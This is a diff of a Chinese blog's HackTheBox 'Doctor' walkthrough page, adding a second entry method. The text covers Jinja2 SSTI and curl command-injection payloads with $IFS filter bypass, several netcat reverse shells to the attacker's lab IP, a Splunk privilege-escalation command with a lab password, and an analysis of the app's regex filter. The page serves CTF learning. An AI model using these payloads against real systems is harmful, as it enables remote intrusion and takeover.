@@ -23,12 +23,12 @@
   </script>
 
 
-  <meta name="description" content="Doctor信息收集">
+  <meta name="description" content="信息收集端口扫描">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HTB:Doctor">
 <meta property="og:url" content="http://evilarsene.icu/2020/10/10/HTB-Doctor/index.html">
 <meta property="og:site_name" content="Love ❤ Hacking">
-<meta property="og:description" content="Doctor信息收集">
+<meta property="og:description" content="信息收集端口扫描">
 <meta property="og:locale">
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/1.png">
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/2.png">
@@ -41,13 +41,17 @@
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/9.png">
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/10.png">
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/doctor/17.png">
+<meta property="og:image" content="http://evilarsene.icu/images/doctor/18.png">
+<meta property="og:image" content="http://evilarsene.icu/images/doctor/19.png">
+<meta property="og:image" content="http://evilarsene.icu/images/doctor/20.png">
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/12.png">
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/13.png">
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/14.png">
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/15.png">
 <meta property="og:image" content="http://evilarsene.icu/images/doctor/16.png">
 <meta property="article:published_time" content="2020-10-10T15:48:06.000Z">
-<meta property="article:modified_time" content="2020-10-10T16:42:18.650Z">
+<meta property="article:modified_time" content="2021-02-06T21:18:52.486Z">
 <meta property="article:author" content="EvilArsene">
 <meta property="article:tag" content="Linux靶机">
 <meta name="twitter:card" content="summary">
@@ -241,7 +245,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-11 00:42:18" itemprop="dateModified" datetime="2020-10-11T00:42:18+08:00">2020-10-11</time>
+                <time title="修改时间：2021-02-07 05:18:52" itemprop="dateModified" datetime="2021-02-07T05:18:52+08:00">2021-02-07</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -264,19 +268,19 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="Doctor"><a href="#Doctor" class="headerlink" title="Doctor"></a>Doctor</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/doctor/1.png" alt="1"></p>
-<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动检查80端口</p>
+        <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="/images/doctor/1.png" alt="1"></p>
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h2><p>手动检查80端口</p>
 <p><img src="/images/doctor/2.png" alt="2"></p>
 <p>发现了存在域名，添加到<code>hosts</code>里，再次访问</p>
 <p><img src="/images/doctor/3.png" alt="3"></p>
 <p>发现了一个登录页面</p>
-<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>找不到登录凭据，搜索不到CMS版本，进行一些常规枚举也没什么收获</p>
+<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>找不到登录凭据，搜索不到CMS版本，进行一些常规枚举也没什么收获</p>
 <p>注册一个账号登进去看看</p>
 <p><img src="/images/doctor/4.png" alt="4"></p>
 <p>注册登录成功，不过账号只保留20分钟</p>
 <p>发现留言板功能</p>
 <p><img src="/images/doctor/5.png" alt="5"></p>
-<p>源代码中发现了一个测试页面</p>
+<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>源代码中发现了一个测试页面</p>
 <p><img src="/images/doctor/6.png" alt="6"></p>
 <p>我们在留言随便输入一些数据</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Title:</span><br><span class="line">abc</span><br><span class="line">Content:</span><br><span class="line">cba</span><br></pre></td></tr></table></figure>
@@ -301,20 +305,67 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;nc.traditional 10.10.16.2 443 -e &#x2F;bin&#x2F;bash&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/doctor/11.png" alt="11"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>先想办法提升到user权限，寻找一些可能存在凭据的地方</p>
+<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>还是留言版那里，输入自己的IP地址，疑似命令注入漏洞</p>
+<p><img src="/images/doctor/17.png" alt="17"></p>
+<p>发现当前运行的程序是curl</p>
+<p>尝试正常的命令注入的各类符号，这里应该是不能直接连续执行bash命令的</p>
+<p>ping命令没反应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(ping 10.10.16.4)</span><br></pre></td></tr></table></figure>
+
+<p>用户</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(whoami)</span><br></pre></td></tr></table></figure>
+
+<p>执行成功，用户名员应该是web</p>
+<p><img src="/images/doctor/18.png" alt="18"></p>
+<p>尝试空格符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(echo+test)				不成功</span><br><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(echo$IFS&#39;test&#39;)			成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/doctor/19.png" alt="19"></p>
+<p>这题以前CTF也遇到过，当时还是个二次注入的curl注入/(ㄒoㄒ)/~~</p>
+<p>此时的思路应该为无管道符直接反弹shell或者文件落地，这两种方法都行</p>
+<p>写一个反弹shell保存在evil这个文件里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;evil$IFS&#39;-o&#39;$IFS&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;test&#39;</span><br></pre></td></tr></table></figure>
+
+<p>之后IP访问(不要HOST访问)，就可以发现文件被上传了</p>
+<p><img src="/images/doctor/20.png" alt="20"></p>
+<p>这里是为了确保看到文件回显，更保险一点，应该上传到tmp，避免web目录不存在或者权限问题</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(bash$IFS&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;test&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.16.4&#x2F;$(nc.traditional$IFS&#39;10.10.16.4&#39;$IFS&#39;5555&#39;$IFS&#39;-e&#39;$IFS&#39;&#x2F;bin&#x2F;bash&#39;)</span><br></pre></td></tr></table></figure>
+
+<p>都能拿到shell，这里需要注意bash下的命令 解析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(ping 127.0.0.1)</span><br><span class="line">$(ping$IFS&#39;127.0.0.1&#39;)			注意引号</span><br><span class="line">&#123;ping,127.0.0.1&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>先想办法提升到user权限，寻找一些可能存在凭据的地方</p>
 <p><img src="/images/doctor/12.png" alt="12"></p>
 <p>在backup关键词里，发现了显眼的文件</p>
 <p><img src="/images/doctor/13.png" alt="13"></p>
 <p>可以找到用户<code>shaun</code>的密码</p>
-<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>发现了一个奇怪的用户splunk</p>
+<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>发现了一个奇怪的用户splunk</p>
 <p><img src="/images/doctor/14.png" alt="14"></p>
 <p>google搜索，可以发现一个可利用提权工具，<a target="_blank" rel="noopener" href="https://github.com/cnotin/SplunkWhisperer2">链接</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.16.2 --username shaun --password Guitar123 --payload &#39;nc.traditional -e &#x2F;bin&#x2F;sh 10.10.16.2 443&#39;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.16.2 --username shaun --password Guitar123 --payload &#39;nc.traditional -e &#x2F;bin&#x2F;sh 10.10.16.4 443&#39;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/images/doctor/15.png" alt="15"></p>
 <p>获取shell</p>
 <p><img src="/images/doctor/16.png" alt="16"></p>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>entry point比较隐蔽，花了很长时间，后面了解一个工具<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">tplmap</a>，也许可以节约时间</p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>似乎<a target="_blank" rel="noopener" href="https://github.com/epinna/tplmap">tplmap</a>在这里有不错的效果，也许可以节约时间</p>
+<h2 id="跟新"><a href="#跟新" class="headerlink" title="跟新:"></a>跟新:</h2><p>看了IppSec的write up，修复ssti的方式非常厉害Orz</p>
+<p>不过他对于代码注入的那部分解说的有一些错误</p>
+<p>在\blog\flaskblog\posts文件里</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">text &#x3D; form.data</span><br><span class="line">urls &#x3D; re.findall(&#39;http[s]?:&#x2F;&#x2F;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#39;, text)</span><br><span class="line">for url in urls:</span><br><span class="line">    url &#x3D; urls[0]</span><br><span class="line">    ...正常逻辑...</span><br></pre></td></tr></table></figure>
+
+<p>这部分黑名单没有进行严格过滤，比如大括号，举个例子</p>
+<p>成功的exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; text&#x3D;&quot;http:&#x2F;&#x2F;192.168.110.1&#x2F;$(whoami)&quot;</span><br><span class="line">&gt;&gt;&gt; urls &#x3D; re.findall(&#39;http[s]?:&#x2F;&#x2F;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#39;, text)</span><br><span class="line">&gt;&gt;&gt; print (urls)</span><br><span class="line">[&#39;http:&#x2F;&#x2F;192.168.110.1&#x2F;$(whoami)&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>失败的exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; text&#x3D;&quot;http:&#x2F;&#x2F;192.168.110.1&#x2F;|whoami&quot;</span><br><span class="line">&gt;&gt;&gt; urls &#x3D; re.findall(&#39;http[s]?:&#x2F;&#x2F;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#39;, text)</span><br><span class="line">&gt;&gt;&gt; print (urls)</span><br><span class="line">[&#39;http:&#x2F;&#x2F;192.168.110.1&#x2F;&#39;]</span><br></pre></td></tr></table></figure>
+
+<p>视频里说的<code>&#123;&#125;</code>只是格式化字符，并不影响过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; string&#x3D;&#39;a&#39;</span><br><span class="line">&gt;&gt;&gt; print(f&quot;hello &#123;string&#125;&quot;)</span><br><span class="line">hello a</span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -398,7 +449,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Doctor"><span class="nav-number">1.</span> <span class="nav-text">Doctor</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text">枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#user"><span class="nav-number">1.3.1.</span> <span class="nav-text">user</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#root"><span class="nav-number">1.3.2.</span> <span class="nav-text">root</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">小结</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.2.</span> <span class="nav-text">枚举</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">2.</span> <span class="nav-text">渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%951"><span class="nav-number">2.1.</span> <span class="nav-text">方法1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%952"><span class="nav-number">2.2.</span> <span class="nav-text">方法2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#user"><span class="nav-number">3.1.</span> <span class="nav-text">user</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#root"><span class="nav-number">3.2.</span> <span class="nav-text">root</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-number">4.</span> <span class="nav-text">小结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%9F%E6%96%B0"><span class="nav-number">4.1.</span> <span class="nav-text">跟新:</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -414,20 +465,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">132</span>
+          <span class="site-state-item-count">137</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
